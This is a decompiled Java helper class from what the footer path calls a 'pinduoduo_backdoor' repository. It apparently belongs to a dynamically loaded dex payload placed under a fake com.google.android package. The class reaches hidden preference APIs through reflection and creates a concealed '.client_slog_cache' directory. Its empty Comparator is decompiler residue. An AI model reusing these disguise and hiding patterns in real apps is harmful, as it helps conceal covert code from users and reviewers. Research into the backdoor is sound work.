package com.google.android.sd.biz_dynamic_dex.base;

import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;
import java.io.File;
import java.util.Comparator;

public final class a {
  private static final Comparator<File> a = new Comparator<File>() {
    
    };
  
  public static SharedPreferences a(Context paramContext, File paramFile) {
    if (!paramFile.exists())
      return null; 
    try {
      SharedPreferences sharedPreferences = (SharedPreferences)Class.forName("android.content.Context").getMethod("getSharedPreferences", new Class[] { File.class, int.class }).invoke(paramContext, new Object[] { paramFile, Integer.valueOf(4) });
      return (sharedPreferences != null) ? sharedPreferences : null;
    } catch (Exception exception) {
      return null;
    } 
  }
  
  public static File a(Context paramContext) {
    File file = new File(paramContext.getFilesDir(), ".client_slog_cache");
    if (!file.exists() || !file.isDirectory())
      file.mkdirs(); 
    file = new File(file, "temp");
    if (!file.exists() || !file.isDirectory())
      file.mkdirs(); 
    return file;
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\da03be2689cc463f901806b5b417c9f5-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */